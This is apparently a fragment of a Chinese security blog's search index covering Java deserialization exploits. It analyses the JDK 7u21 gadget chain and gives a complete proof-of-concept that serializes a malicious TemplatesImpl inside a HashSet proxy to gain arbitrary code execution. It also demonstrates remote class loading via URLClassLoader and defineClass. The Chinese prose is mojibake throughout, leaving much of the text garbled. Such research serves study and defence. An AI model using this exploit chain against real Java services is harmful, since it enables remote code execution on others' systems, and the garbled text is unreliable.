å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"å‚è€ƒ web æ”»é˜²æŠ€æœ¯|å†…å­˜é©¬åˆ†æ å†…å­˜é©¬åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ Tomcat å†…å­˜é©¬å­¦ä¹  ä¸€æ–‡çœ‹æ‡‚å†…å­˜é©¬ python flask å†…å­˜é©¬ Tomcat å†…å­˜é©¬åˆæ¢ ","date":"2021-09-22","objectID":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/:4:0","tags":["æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"title":"Webshell å†…å­˜é©¬åˆ†æ","uri":"/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"7U21 Gadget åˆ†æ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["ä»£ç å®¡è®¡"],"content":"JDK 7U21 Gadget é—®é¢˜ å‰é¢çš„æ–‡ç« ä¸­ä»‹ç»çš„éƒ½æ˜¯åˆ©ç”¨ç¬¬ä¸‰æ–¹åº“çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚æ²¡æœ‰åˆé€‚çš„ç¬¬ä¸‰æ–¹åº“å­˜åœ¨æ—¶ï¼ŒJava ååºåˆ—åŒ–æ˜¯å¦è¿˜èƒ½åˆ©ç”¨ã€‚ é¦–å…ˆï¼Œå­˜åœ¨ä¸ä¾èµ–ç¬¬ä¸‰æ–¹åº“çš„ Java ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œä½†æ˜¯ï¼ŒJava æ–°ç‰ˆæœ¬æ²¡æœ‰è¿™æ ·çš„é—®é¢˜ã€‚ ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 åŸç† JDK7u21 çš„æ ¸å¿ƒç‚¹æ˜¯ sun.reflect.annotation.AnnotationInvocationHandler ï¼Œè¿™ä¸ªç±»åœ¨ä¹‹å‰çš„åˆ†æä¸­æåˆ°è¿‡ã€‚åœ¨ AnnotationInvocationHandler ç±»ä¸­æœ‰ä¸ª equalsImpl æ–¹æ³•: åå°„è°ƒç”¨ï¼šmemberMethod.invoke(o) ï¼Œè€Œ memberMethod æ¥è‡ªäº this.type.getDeclaredMethods() ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œ equalsImpl è¿™ä¸ªæ–¹æ³•æ˜¯å°† this.type ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•éå†å¹¶æ‰§è¡Œäº†ã€‚é‚£ä¹ˆï¼Œå‡è®¾ this.type æ˜¯ Templates ç±»ï¼Œåˆ™åŠ¿å¿…ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„ newTransformer() æˆ– getOutputProperties() æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘ä»»æ„ä»£ç æ‰§è¡Œã€‚è¿™å°±æ˜¯ JDK7u21 çš„æ ¸å¿ƒåŸç†ã€‚ ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 æ„é€  ç°åœ¨çš„æ€è·¯å°±æ˜¯é€šè¿‡ååºåˆ—åŒ–è°ƒç”¨ equalsImpl ï¼Œ equalsImpl æ˜¯ä¸€ä¸ªç§æœ‰æ–¹æ³•ï¼Œåœ¨ AnnotationInvocationHandler#invoke ä¸­è¢«è°ƒç”¨ï¼š InvocationHandler æ˜¯ä¸€ä¸ªæ¥å£ï¼Œåªæœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ invokeã€‚ å‰é¢çš„æ–‡ç« æåˆ°è¿‡ï¼Œåœ¨ä½¿ç”¨ java.reflect.Proxy åŠ¨æ€ç»‘å®šä¸€ä¸ªæ¥å£æ—¶ï¼Œå¦‚æœè°ƒç”¨è¯¥æ¥å£ä¸­ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œä¼šæ‰§è¡Œåˆ° InvocationHandler#invokeã€‚æ‰§è¡Œ invoke æ—¶ï¼Œè¢«ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¿™ä¸ª proxy å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¢«æ‰§è¡Œçš„æ–¹æ³•åï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ‰§è¡Œæ—¶çš„å‚æ•°åˆ—è¡¨ã€‚ è€Œ AnnotationInvocationHandler å°±æ˜¯ä¸€ä¸ª InvocationHandler æ¥å£çš„å®ç°ï¼Œå®ƒçš„ invoke æ–¹æ³•: å¯è§ï¼Œå½“æ–¹æ³•åç­‰äº equalsï¼Œä¸”ä»…æœ‰ä¸€ä¸ª Object ç±»å‹å‚æ•°æ—¶ï¼Œä¼šè°ƒç”¨åˆ° equalImpl æ–¹æ³•ã€‚ æ‰€ä»¥ï¼Œç°åœ¨çš„é—®é¢˜å˜æˆï¼Œæ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å¯¹ proxy è°ƒç”¨ equals æ–¹æ³•ã€‚ ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 è°ƒç”¨é“¾ åœ¨æ¯”è¾ƒ Java å¯¹è±¡æ—¶ï¼Œå¸¸ç”¨åˆ°ä¸¤ç§æ–¹æ³•ï¼š equals compareTo ä»»æ„ Java å¯¹è±¡éƒ½æ‹¥æœ‰ equals æ–¹æ³•ï¼Œå®ƒé€šå¸¸ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¼•ç”¨ã€‚å¦ä¸€ä¸ªå¸¸è§çš„ä¼šè°ƒç”¨ equals çš„åœºæ™¯å°±æ˜¯é›†åˆ setã€‚set ä¸­å‚¨å­˜çš„å¯¹è±¡ä¸å…è®¸é‡å¤ï¼Œæ‰€ä»¥åœ¨æ·»åŠ å¯¹è±¡çš„æ—¶å€™ï¼ŒåŠ¿å¿…ä¼šæ¶‰åŠåˆ°æ¯”è¾ƒæ“ä½œã€‚ HashSet çš„ readObject æ–¹æ³•: è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ª HashMapï¼Œå°†å¯¹è±¡ä¿å­˜åœ¨ HashMap çš„ key å¤„æ¥åšå»é‡ã€‚ è·Ÿè¿› HashMap çš„ put æ–¹æ³•ï¼š å˜é‡ i å°±æ˜¯å“ˆå¸Œå€¼ã€‚ä¸¤ä¸ªä¸åŒçš„å¯¹è±¡çš„ i ç›¸ç­‰æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œåˆ° key.equals(k) ï¼Œè§¦å‘å‰é¢è¯´è¿‡çš„ä»£ç æ‰§è¡Œã€‚ æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯ä¸ºäº†è®© proxy å¯¹è±¡çš„å“ˆå¸Œï¼Œç­‰äº TemplateImpl å¯¹è±¡çš„å“ˆå¸Œã€‚ è®¡ç®—å“ˆå¸Œçš„ä¸»è¦æ˜¯ä¸‹é¢è¿™ä¸¤è¡Œä»£ç ï¼š int hash = hash(key); int i = indexFor(hash, table.length); å°†å…¶ä¸­çš„å…³é”®é€»è¾‘æå–å‡ºæ¥ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢è¿™ä¸ªå‡½æ•°: public static int hash(Object key) { int h = 0; h ^= key.hashCode(); h ^= (h \u003e\u003e\u003e 20) ^ (h \u003e\u003e\u003e 12); h = h ^ (h \u003e\u003e\u003e 7) ^ (h \u003e\u003e\u003e 4); return h \u0026 15; } é™¤äº† key.hashCode() å¤–å†æ²¡æœ‰å…¶ä»–å˜é‡ï¼Œæ‰€ä»¥ proxy å¯¹è±¡ä¸ TemplateImpl å¯¹è±¡çš„å“ˆå¸Œæ˜¯å¦ç›¸ç­‰ï¼Œä»…å–å†³äºè¿™ä¸¤ä¸ªå¯¹è±¡çš„ hashCode() è¿”å›å€¼æ˜¯å¦ç›¸ç­‰ã€‚TemplateImpl çš„ hashCode() æ˜¯ä¸€ä¸ªNative æ–¹æ³•ï¼Œæ¯æ¬¡è¿è¡Œéƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œç†è®ºä¸Šæ˜¯æ— æ³•é¢„æµ‹çš„ï¼Œæ‰€ä»¥æƒ³è®© proxy çš„ hashCode() ä¸ä¹‹ç›¸ç­‰ï¼Œåªèƒ½é€šè¿‡ proxy.hashCode() ã€‚ proxy.hashCode() ä»ç„¶ä¼šè°ƒç”¨åˆ° AnnotationInvocationHandler#invoke ï¼Œè¿›è€Œè°ƒç”¨åˆ° AnnotationInvocationHandler#hashCodeImpl ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•: éå†è¿™ä¸ª Map ä¸­çš„æ¯ä¸ª key å’Œ valueï¼Œè®¡ç®—æ¯ä¸ª (127 * key.hashCode()) ^ value.hashCode() å¹¶æ±‚å’Œã€‚ JDK7u21 ä¸­ä½¿ç”¨äº†ä¸€ä¸ªéå¸¸å·§å¦™çš„æ–¹æ³•ï¼š å½“ memberValues ä¸­åªæœ‰ä¸€ä¸ª key å’Œä¸€ä¸ª value æ—¶ï¼Œè¯¥å“ˆå¸Œç®€åŒ–æˆ (127 * key.hashCode()) ^ value.hashCode() å½“ key.hashCode()==0 æ—¶ï¼Œä»»ä½•æ•°å¼‚æˆ– 0 çš„ç»“æœä»æ˜¯å®ƒæœ¬èº«ï¼Œæ‰€ä»¥è¯¥å“ˆå¸Œç®€åŒ–æˆ value.hashCode() å½“ value å°±æ˜¯ TemplateImpl æ—¶ï¼Œè¿™ä¸¤ä¸ªå“ˆå¸Œå°±å˜æˆå®Œå…¨ç›¸ç­‰ å› æ­¤ï¼Œé€šè¿‡å¯»æ‰¾ä¸€ä¸ª hashCode æ˜¯ 0 çš„å¯¹è±¡ä½œä¸ºçš„ keyï¼Œå°†æ¶æ„ TemplateImpl å¯¹è±¡ä½œä¸º valueï¼Œè¿™ä¸ª proxy è®¡ç®—çš„ hashCode å°±ä¸ TemplateImpl å¯¹è±¡æœ¬èº«çš„ hashCode ç›¸ç­‰äº†ã€‚ æ‰¾ä¸€ä¸ª hashCode æ˜¯ 0 çš„å¯¹è±¡ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„çˆ†ç ´ç¨‹åºæ¥å®ç°ï¼š public static void bruteHashCode() { for (long i = 0; i \u003c 9999999999L; i++) { if (Long.toHexString(i).hashCode() == 0) { System.out.println(Long.toHexString(i)); } } } ç¬¬ä¸€ä¸ªç»“æœæ˜¯ f5a5a608ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ ysoserial ä¸­ç”¨åˆ°çš„å­—ç¬¦ä¸²ã€‚ ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 æ€»ç»“ æŒ‰ç…§å¦‚ä¸‹æ­¥éª¤æ¥æ„é€ ï¼š ç”Ÿæˆæ¶æ„ TemplateImpl å¯¹è±¡ å®ä¾‹åŒ– AnnotationInvocationHandler å¯¹è±¡ type å±æ€§æ˜¯ TemplateImpl ç±» memberValues å±æ€§æ˜¯ä¸€ä¸ª Mapï¼ŒMap åªæœ‰ä¸€ä¸ª key å’Œ valueï¼Œkey æ˜¯å­—ç¬¦ä¸² ï¼Œ value æ˜¯å‰é¢ç”Ÿæˆçš„æ¶æ„ TemplateImpl å¯¹è±¡ å¯¹è¿™ä¸ª AnnotationInvocationHandler å¯¹è±¡åšä¸€å±‚ä»£ç†ï¼Œç”Ÿæˆ proxy å¯¹è±¡ å®ä¾‹åŒ–ä¸€ä¸ª HashSetï¼Œè¿™ä¸ª HashSet æœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œåˆ†åˆ«æ˜¯ï¼š TemplateImpl å¯¹è±¡ proxy å¯¹è±¡ å°† HashSet å¯¹è±¡è¿›è¡Œåºåˆ—åŒ– ååºåˆ—åŒ–è§¦å‘ä»£ç æ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼š è§¦å‘ HashSet çš„ readObject æ–¹æ³•ï¼Œå…¶ä¸­ä½¿ç”¨ HashMap çš„ key åšå»é‡ å»é‡æ—¶è®¡ç®— HashSet ä¸­çš„ä¸¤ä¸ªå…ƒç´ çš„ hashCode ï¼Œé€šè¿‡æ„é€ äºŒè€…ç›¸ç­‰ï¼Œè¿›è€Œè§¦å‘ equals() æ–¹æ³• è°ƒç”¨ AnnotationInvocationHandler#equalsImpl æ–¹æ³• equalsImpl ä¸­éå† this.type çš„æ¯ä¸ªæ–¹æ³•å¹¶è°ƒç”¨ this.type æ˜¯ TemplatesImpl ç±»ï¼Œæ‰€ä»¥è§¦å‘äº† newTransform() æˆ– getOutputProperties() æ–¹æ³• ä»»æ„ä»£ç æ‰§è¡Œ POC å¦‚ä¸‹ï¼š package main.java; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.HashSet; import java.util.LinkedHashSet; import java.util.Map; public class OriginalGadgetDemo { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"/Volumes/MacOS/WorkSpace/JAVA/7u21Gadget/src/main/java/EvilTemplatesImpl.class\")); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{code}); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); String zeroHashCodeStr = \"f5a5a608\"; // å®ä¾‹åŒ–ä¸€ä¸ªmapï¼Œå¹¶æ·»åŠ Magic Numberä¸ºkeyï¼Œä¹Ÿå°±æ˜¯f5a5a608ï¼Œvalueå…ˆéšä¾¿è®¾ç½®ä¸€ä¸ªå€¼ HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); // å®ä¾‹åŒ–AnnotationInvocationHandlerç±» Constructor handlerConstructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handlerConstructor.setAccessible(true); InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map); // ä¸ºtempHandleråˆ›é€ ä¸€å±‚ä»£ç† Templates proxy = (Templates) Proxy.newProxyInstance(OriginalGadgetDemo.class.getClassLoader(), new Class[]{Templates.class}, tempHandler); // å®ä¾‹åŒ–HashSetï¼Œå¹¶å°†ä¸¤ä¸ªå¯¹è±¡æ”¾è¿›å» HashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); // å°†æ¶æ„templatesè®¾ç½®åˆ°mapä¸­ map.put(zeroHashCodeStr, templates); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(set); oos.close(); // System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒ phith0n Java æ¼«è°ˆç³»åˆ— Javaååºåˆ—åŒ–æ¼æ´åŸç†è§£æ Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°å…³é—¨ ä»0å¼€å§‹å­¦Javaååºåˆ—åŒ–æ¼æ´ æ·±å…¥ç†è§£ JAVA ååºåˆ—åŒ–æ¼æ´ Javaååºåˆ—åŒ–åˆ©ç”¨é“¾è¡¥å…¨è®¡åˆ’ Commons-Collections åˆ©ç”¨é“¾åˆ†æ æ·±å…¥ Java åŸç”Ÿååºåˆ—åŒ– \u0026 JDK7u21 åˆ©ç”¨é“¾åˆ†æ ","date":"2021-09-01","objectID":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-5","uri":"/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Java åŠ¨æ€åŠ è½½å­—èŠ‚ç  \u0026\u0026 CC 3ã€5ã€7","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4 ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 Java åŠ¨æ€åŠ è½½å­—èŠ‚ç  ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 å­—èŠ‚ç  ä¸¥æ ¼æ¥è¯´ï¼ŒJava å­—èŠ‚ç å…¶å®ä»…ä»…æŒ‡çš„æ˜¯ Java è™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨ åœ¨ .class æ–‡ä»¶ä¸­ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸åŒå¹³å°ã€ä¸åŒ CPU çš„è®¡ç®—æœºæŒ‡ä»¤æœ‰å·®å¼‚ï¼Œä½†å› ä¸º Java æ˜¯ä¸€é—¨è·¨å¹³å°çš„ç¼–è¯‘å‹è¯­è¨€ï¼Œæ‰€ä»¥è¿™äº›å·®å¼‚å¯¹äºä¸Šå±‚å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„ï¼Œä¸Šå±‚å¼€å‘è€…åªéœ€è¦å°†è‡ªå·±çš„ä»£ç ç¼–è¯‘ä¸€æ¬¡ï¼Œå³å¯è¿è¡Œåœ¨ä¸åŒå¹³å°çš„ JVM è™šæ‹Ÿæœºä¸­ã€‚ ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ class æ–‡ä»¶ åˆ©ç”¨ Java çš„ ClassLoader æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ã€‚å˜‰æ–‡ä¸»è¦è¯´æ˜ URLClassLoaderã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJava ä¼šæ ¹æ®é…ç½®é¡¹ sun.boot.class.path å’Œ java.class.path ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„(è¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»)æ¥å¯»æ‰¾ .class æ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š URL æœªä»¥æ–œæ  / ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ª JAR æ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨ Jar åŒ…ä¸­å¯»æ‰¾ .class æ–‡ä»¶ URL ä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾ .class æ–‡ä»¶ URL ä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±» æ­£å¸¸å¼€å‘çš„æ—¶å€™é€šå¸¸é‡åˆ°çš„æ˜¯å‰ä¸¤è€…ï¼Œé‚£ä»€ä¹ˆæ—¶å€™æ‰ä¼šå‡ºç°ä½¿ç”¨ Loader å¯»æ‰¾ç±»çš„æƒ…å†µå‘¢ï¼Ÿå½“ç„¶æ˜¯é file åè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ http åè®®ã€‚ ä½¿ç”¨ HTTP åè®®æ¥æµ‹è¯•ï¼Œä»è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸ŠåŠ è½½ .class æ–‡ä»¶ï¼š ClassLoader.java package com.geekby.javavuln; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception { URL[] urls = {new URL(\"http://localhost:8000/\")}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(\"Hello\"); Method f = c.getMethod(\"test\"); f.invoke(null, null); } } Hello.java public class Hello { public static void test() { System.out.println(\"test\"); } } æ‰§è¡Œ: æˆåŠŸè¯·æ±‚åˆ° /Hello.class æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ï¼Œè¾“å‡ºäº†ã€Œtestã€ã€‚ æ‰€ä»¥ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡ Java ClassLoader çš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ª http æœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥åˆ©ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚ ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:1:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.3 åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç  ä¸ç®¡æ˜¯åŠ è½½è¿œç¨‹ class æ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„ class æˆ– jar æ–‡ä»¶ï¼ŒJava éƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨: ClassLoader#loadClass ClassLoader#findClass ClassLoader#defineClass å…¶ä¸­ï¼š loadClass çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€ URL æŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå°±åƒä¸Šä¸€èŠ‚ä¸­è¯´åˆ°çš„ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jar åŒ…æˆ–è¿œç¨‹ http æœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClass defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„ Java ç±» å› æ­¤ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ defineClass ï¼Œå…¶å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ª Java ç±»ï¼ŒJava é»˜è®¤çš„ ClassLoader#defineClass æ˜¯ä¸€ä¸ª native æ–¹æ³•ï¼Œé€»è¾‘åœ¨ JVM çš„ C è¯­è¨€ä»£ç ä¸­ã€‚ é€šè¿‡ç®€å•çš„ä»£ç ç¤ºä¾‹ï¼Œæ¼”ç¤º defineClass åŠ è½½å­—èŠ‚ç ï¼š public class defineClassDemo { public static void main(String[] args) throws Exception{ Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); // è¯»å–å­—èŠ‚ç å¹¶è¿›è¡Œ base64 ç¼–ç  byte[] b = Files.readAllBytes(Paths.get(\"Hello.class\")); String code = Base64.getEncoder().encodeToString(b); // base64 è§£ç  byte[] byteCode = Base64.getDecoder().decode(code); Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", byteCode, 0, byteCode.length); Method m = hello.getMethod(\"test\", null); m.invoke(null, null); } } ä¿¡æ¯ åœ¨ defineClass è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç 